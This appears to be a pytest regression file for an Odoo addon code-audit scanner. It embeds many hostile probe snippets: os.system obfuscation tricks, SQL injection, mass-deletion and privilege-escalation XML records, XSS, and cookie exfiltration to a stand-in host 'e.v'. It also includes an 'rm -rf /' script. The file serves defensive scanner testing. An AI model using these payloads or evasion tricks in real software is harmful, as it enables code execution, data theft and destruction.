"""Regression probes for BOT-CODE-AUDIT-4 review findings H1-H7, M1, M2, M5 and variants.

Each probe must yield a HIGH/MEDIUM finding or fail closed; quiet variants must not.
"""

# ruff: noqa: E501
import gzip
import io
import zipfile

import pytest

from app.bots import code_audit as ca

MAN = b"{'name':'x','version':'17.0.1.0.0','depends':['base','web','mail'],'license':'LGPL-3','data':['views/v.xml'],'assets':{'web.assets_backend':['x/static/src/**/*']}}"


def audit(files):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("x/__manifest__.py", MAN)
        z.writestr("x/__init__.py", b"from . import models\n")
        z.writestr("x/models/__init__.py", b"from . import a, h1, h2\n")
        for k, v in files.items():
            z.writestr("x/" + k, v.encode() if isinstance(v, str) else v)
    r = ca.audit(b.getvalue(), version=17)
    if not r.ok:
        return "ERR:" + str(r.error)[:80]
    return sorted({(f.code, f.severity) for f in r.findings if f.file in files})


H = "import os, subprocess, functools, operator, importlib\nfrom odoo import models, http\nfrom odoo.http import request\n"


def py(body):
    return audit(
        {
            "models/a.py": H
            + "class A(models.Model):\n    _name='a.a'\n    def f(self, n):\n"
            + "\n".join("        " + ln for ln in body.split("\n"))
            + "\n"
        }
    )


def pyt(src):
    return audit({"models/a.py": H + src})


def xml(b):
    return audit({"views/v.xml": "<odoo>\n" + b + "\n</odoo>\n"})


def js(s, n="static/src/a.js"):
    return audit({n: s})


P = {}
# python
P["nested-container"] = lambda: py("d={'a':[os.system]}\nd['a'][0]('id')")
P["closure"] = lambda: py(
    "def g():\n    s=os.system\n    def h(c): return s(c)\n    return h\ng()('id')"
)
P["lambda"] = lambda: py("x=lambda c: os.system(c)\nx('id')")
P["lambda-bare"] = lambda: py("(lambda q: q('id'))(os.system)")
P["class-attr"] = lambda: pyt("class Z:\n    run=os.system\nZ.run('id')\nZ().run('id')")
P["comprehension"] = lambda: py("[f('id') for f in [os.system]]")
P["generator-next"] = lambda: py("next(f for f in [os.popen])('id')")
P["partial"] = lambda: py("functools.partial(os.system,'id')()")
P["methodcaller"] = lambda: py("operator.methodcaller('system','id')(os)")
P["attrgetter"] = lambda: py("operator.attrgetter('system')(os)('id')")
P["importlib"] = lambda: py("importlib.import_module('o'+'s').system('id')")
P["__import__"] = lambda: py("__import__('subprocess').run(['id'])")
P["builtins-import"] = lambda: py("import builtins\nbuiltins.__import__('os').system('id')")
P["strbuilt-getattr"] = lambda: py("getattr(os,'sys'+'tem')('id')")
P["strjoin-getattr"] = lambda: py("getattr(os,''.join(['sy','stem']))('id')")
P["cond-rebind"] = lambda: py("f=print\nif n: f=os.system\nf('id')")
P["decorator"] = lambda: pyt("def deco(fn):\n    return os.system\n@deco\ndef g(): pass\ng('id')")
P["walrus"] = lambda: py("(s:=os.system)('id')")
P["tuple-unpack"] = lambda: py("a,b=print,os.system\nb('id')")
P["star-unpack"] = lambda: py("*_,b=[print,os.system]\nb('id')")
P["dict-get"] = lambda: py("{'k':os.system}.get('k')('id')")
P["setattr-self"] = lambda: py("setattr(self,'r',os.system)\nself.r('id')")
P["eval-codeobj"] = lambda: py("compile('1','a','exec')")
P["type-builtins"] = lambda: py("().__class__.__base__.__subclasses__()")
P["vars-module"] = lambda: py("vars(os)['system']('id')")
P["os-dict"] = lambda: py("os.__dict__['system']('id')")
P["pickle"] = lambda: py("import pickle\npickle.loads(n)")
P["marshal"] = lambda: py("import marshal\nexec(marshal.loads(n))")
P["ctypes"] = lambda: py("import ctypes\nctypes.CDLL(None).system(b'id')")
P["sys-modules"] = lambda: py("import sys\nsys.modules['os'].system('id')")
P["two-level-chain"] = lambda: audit(
    {
        "models/a.py": H
        + "from .h1 import outer\nclass C(http.Controller):\n    @http.route('/a')\n    def a(self,**kw):\n        outer(kw.get('q'))\n",
        "models/h1.py": "from .h2 import inner\ndef outer(x):\n    return inner(x)\n",
        "models/h2.py": "import os\ndef inner(y):\n    os.system(y)\n",
    }
)
P["two-level-sql"] = lambda: audit(
    {
        "models/a.py": H
        + "from .h1 import outer\nclass C(http.Controller):\n    @http.route('/a')\n    def a(self,**kw):\n        outer(request.env.cr, kw.get('q'))\n",
        "models/h1.py": "from .h2 import inner\ndef outer(cr,x):\n    return inner(cr,x)\n",
        "models/h2.py": "def inner(cr,y):\n    cr.execute('select '+y)\n",
    }
)
P["sql-format"] = lambda: py("self.env.cr.execute('SELECT * FROM t WHERE a=%s' % n)")
P["sql-fstring"] = lambda: py("self.env.cr.execute(f'SELECT {n}')")
P["sudo-unlink-all"] = lambda: py("self.env['res.users'].sudo().search([]).unlink()")
# xml code-in-data
P["xml-server-eval"] = lambda: xml(
    "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='state'>code</field><field name='code' eval=\"'os.system(1)'\"/></record>"
)
P["xml-rule-domain"] = lambda: xml(
    "<record id='r' model='ir.rule'><field name='name'>r</field><field name='model_id' ref='base.model_res_partner'/><field name='domain_force'>[(1,'=',1)] if user.write({'groups_id':[(4,ref('base.group_system'))]}) else []</field></record>"
)
P["xml-filter-domain"] = lambda: xml(
    "<record id='f' model='ir.filters'><field name='name'>f</field><field name='model_id'>res.partner</field><field name='domain'>[('id','in',__import__('os').system('id'))]</field></record>"
)
P["xml-automation"] = lambda: xml(
    "<record id='b' model='base.automation'><field name='name'>b</field><field name='model_id' ref='base.model_res_partner'/><field name='trigger'>on_create</field><field name='filter_domain'>[]</field><field name='code'>env['res.users'].search([]).unlink()</field></record>"
)
P["xml-tmpl-body"] = lambda: xml(
    "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html' type='html'>&lt;p t-out=\"object.env['res.users'].sudo().search([]).unlink()\"/&gt;</field></record>"
)
P["xml-tmpl-subject-inline"] = lambda: xml(
    "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='subject'>{{ object.env.cr.execute('drop table x') }}</field></record>"
)
P["xml-tmpl-script"] = lambda: xml(
    "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html'>&lt;script&gt;fetch('//e.v/'+document.cookie)&lt;/script&gt;</field></record>"
)
P["xml-website-page"] = lambda: xml(
    "<template id='p'><t t-call='web.layout'><div t-raw='request.params.get(\"q\")'/></t></template>"
)
P["xml-tout-markup"] = lambda: xml(
    "<template id='p'><div t-out='request.params.get(\"q\")'/></template>"
)
P["xml-report-tesc"] = lambda: xml(
    "<template id='rp'><t t-set='x' t-value='doc.env[\"res.users\"].sudo().search([]).unlink()'/></template>"
)
P["xml-ir-ui-view-arch"] = lambda: xml(
    "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='type'>qweb</field><field name='arch' type='xml'><div t-att-onclick='request.params[\"q\"]'/></field></record>"
)
P["xml-config-param"] = lambda: xml(
    "<record id='p' model='ir.config_parameter'><field name='key'>auth_signup.invitation_scope</field><field name='value'>b2c</field></record>"
)
P["xml-function-eval"] = lambda: xml(
    "<function model='ir.config_parameter' name='set_param' eval=\"('database.secret','x')\"/>"
)
P["xml-value-eval"] = lambda: xml(
    "<record id='z' model='res.partner'><field name='name' eval=\"__import__('os').system('id')\"/></record>"
)
P["xml-users-write"] = lambda: xml(
    "<record id='base.user_admin' model='res.users'><field name='password'>x</field></record>"
)
P["xml-delete-search"] = lambda: xml("<delete model='res.partner' search=\"[]\"/>")
P["xml-cron-model-method"] = lambda: xml(
    "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='base.model_res_users'/><field name='state'>code</field><field name='code'>model.search([]).unlink()</field><field name='interval_type'>days</field></record>"
)
P["xml-server-safe_eval-bypass"] = lambda: xml(
    "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='code'>env.cr.execute('UPDATE res_users SET active=false')</field></record>"
)
# js
P["js-function-ctor"] = lambda: js("const F=(()=>{}).constructor; F('alert(1)')();")
P["js-bracket-eval"] = lambda: js("window['ev'+'al']('1')")
P["js-settimeout-str"] = lambda: js("setTimeout('alert(document.cookie)',1)")
P["js-cookie-beacon"] = lambda: js("navigator.sendBeacon('//e.v',document.cookie)")
P["js-cookie-alias"] = lambda: js("const d=document; const c=d['coo'+'kie']; fetch('//e.v/'+c)")
P["js-ws"] = lambda: js("new WebSocket('wss://e.v').send(localStorage.getItem('x'))")
P["js-innerhtml"] = lambda: js("el.innerHTML = location.hash")
P["js-insertAdjacent"] = lambda: js("el.insertAdjacentHTML('beforeend', location.search)")
P["js-markup"] = lambda: js(
    "import {markup} from '@odoo/owl'; const x = markup(this.props.record.data.name);"
)
P["js-tout-markup-owl"] = lambda: js(
    "/** @odoo-module */\nimport {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<div t-out='props.html'/>`}"
)
P["js-import-dynamic"] = lambda: js("import('https://e.v/x.js')")
P["js-worker-blob"] = lambda: js("new Worker(URL.createObjectURL(new Blob([s])))")
P["js-rpc-orm-unlink"] = lambda: js("this.orm.unlink('res.users', ids)")
P["js-postmessage"] = lambda: js("window.addEventListener('message', e=>{ eval(e.data) })")
P["js-template-literal-eval"] = lambda: js("eval(`1`)")
P["js-globalThis"] = lambda: js("globalThis.eval('1')")
P["js-reflect"] = lambda: js("Reflect.apply(eval, null, ['1'])")
P["js-indirect-eval"] = lambda: js("(0,eval)('1')")
P["js-owl-xml-file"] = lambda: js(
    "<templates><t t-name='x'><div t-out='props.v' t-att-href='props.url'/><iframe t-att-src='props.u'/></t></templates>",
    "static/src/a.xml",
)
P["js-unicode-escape"] = lambda: js("window['\\u0065val']('1')")
P["js-css-in-js"] = lambda: js("el.style.backgroundImage='url(//e.v/'+document.cookie+')'")
# css/svg/html
P["css-import-ext"] = lambda: js("@import url('https://e.v/x.css');", "static/src/a.css")
P["css-attr-exfil"] = lambda: js(
    "input[value^='a']{background:url(https://e.v/a)}", "static/src/a.scss"
)
P["css-escape-url"] = lambda: js("a{background:\\75rl(https://e.v/a)}", "static/src/a.css")
P["css-font-ext"] = lambda: js(
    "@font-face{font-family:x;src:url(//e.v/f.woff)}", "static/src/a.css"
)
P["css-expression"] = lambda: js("a{width:expression(alert(1))}", "static/src/a.css")
P["scss-import"] = lambda: js("@use 'https://e.v/x';", "static/src/a.scss")
P["svg-onload"] = lambda: js(
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>", "static/src/i.svg"
)
P["svg-foreignobject"] = lambda: js(
    "<svg xmlns='http://www.w3.org/2000/svg'><foreignObject><iframe xmlns='http://www.w3.org/1999/xhtml' src='javascript:alert(1)'/></foreignObject></svg>",
    "static/src/i.svg",
)
P["svg-use-ext"] = lambda: js(
    "<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><use xlink:href='https://e.v/a.svg#x'/></svg>",
    "static/src/i.svg",
)
P["svg-animate-href"] = lambda: js(
    "<svg xmlns='http://www.w3.org/2000/svg'><a><animate attributeName='href' to='javascript:alert(1)'/><text>x</text></a></svg>",
    "static/src/i.svg",
)
P["svg-set"] = lambda: js(
    "<svg xmlns='http://www.w3.org/2000/svg'><set attributeName='onmouseover' to='alert(1)'/></svg>",
    "static/src/i.svg",
)
P["svg-entity"] = lambda: js(
    "<!DOCTYPE s [<!ENTITY e 'x'>]><svg xmlns='http://www.w3.org/2000/svg'>&e;</svg>",
    "static/src/i.svg",
)
P["svgz"] = lambda: js(b"\x1f\x8b\x08\x00garbage", "static/src/i.svgz")
P["html-meta-refresh"] = lambda: js(
    "<html><meta http-equiv='refresh' content='0;url=javascript:alert(1)'></html>",
    "static/src/a.html",
)
P["html-base"] = lambda: js("<html><base href='https://e.v/'></html>", "static/src/a.html")
P["html-form-action"] = lambda: js(
    "<form action='https://e.v'><input name=p type=password></form>", "static/src/a.html"
)
P["htm-ext"] = lambda: js("<script>alert(1)</script>", "static/src/a.htm")
P["xhtml-ext"] = lambda: js(
    "<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>",
    "static/src/a.xhtml",
)
P["mjs-ext"] = lambda: js("eval('1')", "static/src/a.mjs")
P["cjs-ext"] = lambda: js("eval('1')", "static/src/a.cjs")
P["wasm"] = lambda: js(b"\x00asm\x01\x00\x00\x00", "static/src/a.wasm")
P["js-outside-static"] = lambda: audit({"data/a.js": "eval('1')"})
P["js-in-lib"] = lambda: js("eval(location.hash)", "static/lib/a.js")
P["html-in-data"] = lambda: audit({"data/a.html": "<script>alert(1)</script>"})
P["pyc"] = lambda: audit({"models/b.pyc": b"\x6f\x0d\x0d\x0a" + b"\x00" * 12})
P["so"] = lambda: audit({"models/b.so": b"\x7fELF"})
P["py-other-ext"] = lambda: audit({"models/b.pyw": "import os\nos.system('id')"})
P["hooks-post-init"] = lambda: audit(
    {"hooks.py": "import os\ndef post_init_hook(env):\n    os.system('id')\n"}
)
P["csv-access"] = lambda: audit(
    {
        "security/ir.model.access.csv": "id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\naccess_u,u,base.model_res_users,,1,1,1,1\n"
    }
)
P2 = {}
P2["mc-alias"] = lambda: py("m=operator.methodcaller('system','id')\nm(os)")
P2["mc-from"] = lambda: pyt(
    "from operator import methodcaller as mc\nimport os\nmc('popen','id')(os)"
)
P2["mc-dyn"] = lambda: py("operator.methodcaller(n)(self)")
P2["ag-dotted"] = lambda: py("operator.attrgetter('path')(os)")
P2["compile-dyn"] = lambda: py("compile(n,'a','exec')")
P2["re-compile"] = lambda: pyt("import re\nX=re.compile('a')\n")
P3 = {}
P3["pycache-pyc"] = lambda: audit({"models/__pycache__/a.cpython-312.pyc": b"\x00" * 16})
P3["sh"] = lambda: audit({"tools/x.sh": "#!/bin/sh\nrm -rf /\n"})
P3["noext"] = lambda: audit({"LICENSE": "MIT"})
P3["noext-shebang"] = lambda: audit({"tools/run": "#!/usr/bin/env python\nimport os\n"})
P3["unknown"] = lambda: audit({"static/src/a.foo": "x"})
P3["zip-nested"] = lambda: audit({"static/src/a.zip": b"PK\x03\x04"})
P3["sql-core"] = lambda: audit({"data/a.sql": "UPDATE res_users SET active=false;"})
P3["key"] = lambda: audit({"data/k.pem": "-----BEGIN PRIVATE KEY-----"})
P3["png"] = lambda: audit({"static/src/a.png": b"\x89PNG"})
P3["svgz-ok"] = lambda: (
    lambda g: audit(
        {
            "static/src/a.svgz": g.compress(
                b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
            )
        }
    )
)(gzip)
P4 = {}
H2 = "from odoo import models, http\nfrom odoo.http import request\nfrom markupsafe import Markup\n"
P4["chain3"] = lambda: audit(
    {
        "models/a.py": H2
        + "def l3(x):\n    return Markup(x)\ndef l2(y):\n    return l3(y)\ndef l1(z, w=1):\n    l2(z)\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        l1(q)\n"
    }
)
P4["chain-safe-arg"] = lambda: audit(
    {
        "models/a.py": H2
        + "def l3(x, y):\n    return Markup(x)\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        l3('a', q)\n"
    }
)
P4["guard-off"] = lambda: audit(
    {
        "models/a.py": H2
        + "def post(body='', body_is_html=False):\n    if body_is_html:\n        body = Markup(body)\n    return body\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        post(body=q)\n"
    }
)
P4["guard-on"] = lambda: audit(
    {
        "models/a.py": H2
        + "def post(body='', body_is_html=False):\n    if body_is_html:\n        body = Markup(body)\n    return body\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        post(body=q, body_is_html=True)\n"
    }
)
P4["guard-pos"] = lambda: audit(
    {
        "models/a.py": H2
        + "def post(body='', body_is_html=False):\n    if body_is_html:\n        body = Markup(body)\n    return body\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        post(q, 1)\n"
    }
)
P4["cross-file"] = lambda: audit(
    {
        "models/h.py": H2 + "def l3(x):\n    return Markup(x)\ndef l2(y):\n    return l3(y)\n",
        "models/a.py": H2
        + "from .h import l2\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        l2(q)\n",
    }
)
P4["method-chain"] = lambda: audit(
    {
        "models/a.py": H2
        + "class M(models.Model):\n    _name='m.m'\n    def _a(self, v):\n        self.env.cr.execute('select '+v)\n    def _b(self, v):\n        self._a(v)\n    def _c(self, v):\n        self._b(v)\nclass C(http.Controller):\n    @http.route('/a')\n    def r(self, q):\n        request.env['m.m']._c(q)\n"
    }
)

ALL = {**P, **P2, **P3, **P4}
QUIET_NO_HIGH = {"re-compile", "noext", "png", "xml-tout-markup", "js-markup"}
QUIET_NO_TAINT = {"chain-safe-arg", "guard-off"}


@pytest.mark.parametrize("name", sorted(set(ALL) - QUIET_NO_HIGH - QUIET_NO_TAINT))
def test_probe_flagged_or_fail_closed(name):
    r = ALL[name]()
    assert (
        isinstance(r, str) and r.startswith("ERR:") or any(s in ("high", "medium") for _, s in r)
    ), (name, r)


@pytest.mark.parametrize("name", sorted(QUIET_NO_HIGH))
def test_quiet_variant_has_no_high(name):
    r = ALL[name]()
    assert not isinstance(r, str) and all(s != "high" for _, s in r), (name, r)


@pytest.mark.parametrize("name", sorted(QUIET_NO_TAINT))
def test_safe_arg_and_guard_off_not_tainted(name):
    r = ALL[name]()
    assert not isinstance(r, str) and ("tainted-markup", "high") not in r, (name, r)


def test_guarded_variants_are_tainted():
    for n in ("guard-on", "guard-pos", "chain3"):
        assert ("tainted-markup", "high") in ALL[n](), n
